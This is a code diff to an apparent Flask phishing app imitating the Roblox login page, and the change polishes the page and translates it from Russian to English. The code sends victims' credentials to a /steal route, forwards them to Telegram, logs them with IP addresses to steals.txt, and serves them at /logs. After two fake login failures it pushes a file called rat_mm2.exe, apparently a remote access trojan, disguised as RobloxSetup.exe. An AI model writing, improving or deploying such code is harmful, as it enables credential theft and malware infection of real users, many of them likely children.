@@ -22,61 +22,225 @@ def index():
     return '''
     <!DOCTYPE html>
     <html>
-    <head><title>Roblox</title></head>
-    <body style="background:#1a1a2e;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:Arial;">
-        <div style="background:#16213e;padding:40px;border-radius:12px;width:340px;text-align:center;">
-            <h2 style="color:white;">Вход в Roblox</h2>
-            <form id="loginForm">
-                <input type="text" id="username" placeholder="Логин" required style="width:100%;padding:12px;margin:6px 0;border:none;border-radius:6px;background:#0f3460;color:white;">
-                <input type="password" id="password" placeholder="Пароль" required style="width:100%;padding:12px;margin:6px 0;border:none;border-radius:6px;background:#0f3460;color:white;">
-                <button type="submit" style="width:100%;padding:12px;background:#00bfff;border:none;border-radius:6px;color:white;font-weight:bold;cursor:pointer;">Войти</button>
-            </form>
-            <div id="message" style="color:#ff6b6b;margin-top:10px;"></div>
-            <div style="margin-top:20px;padding:10px;background:#0f3460;border-radius:6px;display:flex;justify-content:space-between;">
-                <span style="color:#aaccff;" id="filenameDisplay">RobloxSetup.exe</span>
-                <button onclick="copyFilename()" style="background:#2a4a7a;border:none;color:white;padding:6px 14px;border-radius:4px;cursor:pointer;">Копировать</button>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Roblox</title>
+        <style>
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+            body {
+                background: #1b1b2f;
+                font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                margin: 0;
+                padding: 20px;
+            }
+            .login-container {
+                background: #16213e;
+                border-radius: 16px;
+                padding: 40px 35px 35px;
+                width: 400px;
+                max-width: 100%;
+                box-shadow: 0 15px 40px rgba(0,0,0,0.7);
+                text-align: center;
+            }
+            .roblox-logo {
+                width: 180px;
+                margin-bottom: 20px;
+            }
+            .login-title {
+                color: #fff;
+                font-size: 24px;
+                font-weight: 500;
+                margin-bottom: 25px;
+            }
+            .input-group {
+                margin-bottom: 14px;
+                text-align: left;
+            }
+            .input-group label {
+                display: block;
+                color: #b0c4de;
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 5px;
+            }
+            .input-group input {
+                width: 100%;
+                padding: 14px 16px;
+                background: #0f3460;
+                border: 2px solid transparent;
+                border-radius: 8px;
+                color: #fff;
+                font-size: 16px;
+                transition: all 0.25s ease;
+                outline: none;
+            }
+            .input-group input::placeholder {
+                color: #6a8aae;
+                font-weight: 300;
+            }
+            .input-group input:focus {
+                border-color: #00bfff;
+                background: #1a4a7a;
+                box-shadow: 0 0 0 3px rgba(0,191,255,0.2);
+            }
+            .login-btn {
+                width: 100%;
+                padding: 15px;
+                background: #00bfff;
+                border: none;
+                border-radius: 8px;
+                color: #fff;
+                font-size: 18px;
+                font-weight: 700;
+                cursor: pointer;
+                transition: background 0.2s;
+                margin-top: 8px;
+            }
+            .login-btn:hover {
+                background: #009acd;
+            }
+            .login-btn:active {
+                transform: scale(0.98);
+            }
+            .error-message {
+                color: #ff6b6b;
+                font-size: 14px;
+                margin-top: 14px;
+                min-height: 22px;
+                font-weight: 500;
+            }
+            .download-btn {
+                display: none;
+                margin-top: 20px;
+                padding: 15px;
+                background: #00b894;
+                border: none;
+                border-radius: 8px;
+                color: #fff;
+                font-weight: 700;
+                font-size: 16px;
+                cursor: pointer;
+                width: 100%;
+                transition: background 0.2s;
+            }
+            .download-btn:hover {
+                background: #00a381;
+            }
+            .download-btn:active {
+                transform: scale(0.98);
+            }
+            .footer-links {
+                color: #6a8aae;
+                font-size: 13px;
+                margin-top: 22px;
+                border-top: 1px solid #1a4a7a;
+                padding-top: 18px;
+                display: flex;
+                flex-direction: column;
+                gap: 8px;
+            }
+            .footer-links a {
+                color: #6a8aae;
+                text-decoration: none;
+            }
+            .footer-links a:hover {
+                color: #fff;
+            }
+            .signup-link {
+                color: #6a8aae;
+                font-size: 14px;
+                margin-top: 15px;
+            }
+            .signup-link a {
+                color: #00bfff;
+                text-decoration: none;
+            }
+            .signup-link a:hover {
+                text-decoration: underline;
+            }
+        </style>
+    </head>
+    <body>
+    <div class="login-container">
+        <img class="roblox-logo" src="https://www.roblox.com/favicon.ico" alt="Roblox">
+        <h1 class="login-title">Login to Roblox</h1>
+
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username/Email/Phone</label>
+                <input type="text" id="username" placeholder="Username/Email/Phone" required>
             </div>
-            <button id="downloadBtn" style="display:none;margin-top:20px;padding:12px;background:#00b894;border:none;border-radius:6px;color:white;width:100%;cursor:pointer;">⬇️ Скачать RobloxSetup.exe</button>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button class="login-btn" type="submit">Log In</button>
+        </form>
+
+        <div id="message" class="error-message"></div>
+
+        <div class="footer-links">
+            <a href="#">Forgot Password or Username?</a>
+            <a href="#">Email Me a One-Time Code</a>
+            <a href="#">Quick Sign-in</a>
         </div>
-        <script>
-            let attempts = 0;
-            document.getElementById('loginForm').addEventListener('submit', async function(e) {
-                e.preventDefault();
-                const login = document.getElementById('username').value;
-                const pass = document.getElementById('password').value;
-                if (!login || !pass) return;
+
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign Up</a>
+        </div>
+
+        <!-- Кнопка скачивания (появляется после 2-х попыток) -->
+        <button class="download-btn" id="downloadBtn">⬇️ Download RobloxSetup.exe</button>
+    </div>
+
+    <script>
+        let attempts = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const login = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value.trim();
+
+            if (!login || !pass) {
+                document.getElementById('message').innerText = 'Please fill in all fields';
+                return;
+            }
+
+            try {
                 await fetch('/steal', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({login, pass})
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ login, pass })
                 });
-                attempts++;
-                document.getElementById('message').innerText = 'Неверный логин или пароль.';
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-                if (attempts >= 2) {
-                    document.getElementById('message').innerHTML = '⚠️ Ошибка входа. Скачайте обновление.';
-                    document.getElementById('downloadBtn').style.display = 'block';
-                }
-            });
-            function copyFilename() {
-                const text = document.getElementById('filenameDisplay').innerText;
-                navigator.clipboard.writeText(text).catch(() => {
-                    const range = document.createRange();
-                    const span = document.getElementById('filenameDisplay');
-                    range.selectNode(span);
-                    window.getSelection().removeAllRanges();
-                    window.getSelection().addRange(range);
-                    document.execCommand('copy');
-                });
-                alert('Название скопировано');
+            } catch {}
+
+            attempts++;
+            document.getElementById('message').innerText = 'Incorrect username or password. Please try again.';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+
+            if (attempts >= 2) {
+                document.getElementById('message').innerHTML = '⚠️ <span style="color:#ffcc00;">There was a problem with your login.</span> Please download the Roblox update.';
+                document.getElementById('downloadBtn').style.display = 'block';
             }
-            document.getElementById('downloadBtn').addEventListener('click', function() {
-                window.location.href = '/download/roblox_setup.exe';
-                this.innerText = '✅ Файл скачан! Запустите для входа.';
-                this.disabled = true;
-            });
-        </script>
+        });
+
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            window.location.href = '/download/roblox_setup.exe';
+            this.innerText = '✅ File downloaded! Run it to log in.';
+            this.disabled = true;
+            this.style.background = '#00b894';
+        });
+    </script>
     </body>
     </html>
     '''
@@ -87,10 +251,13 @@ def steal():
     login = data.get('login')
     password = data.get('pass')
     ip = request.remote_addr
+
     msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
     send_tg(msg)
+
     with open('steals.txt', 'a', encoding='utf-8') as f:
         f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")
+
     return {"status": "ok"}, 200
 
 @app.route('/download/roblox_setup.exe')
@@ -98,12 +265,12 @@ def download_exe():
     try:
         return send_file('rat_mm2.exe', as_attachment=True, download_name='RobloxSetup.exe')
     except:
-        return "Файл временно недоступен", 404
+        return "File temporarily unavailable", 404
 
 @app.route('/logs')
 def logs():
     if not os.path.exists('steals.txt'):
-        return "Нет логов"
+        return "No logs"
     with open('steals.txt', 'r', encoding='utf-8') as f:
         return f"<pre>{f.read()}</pre>"
 
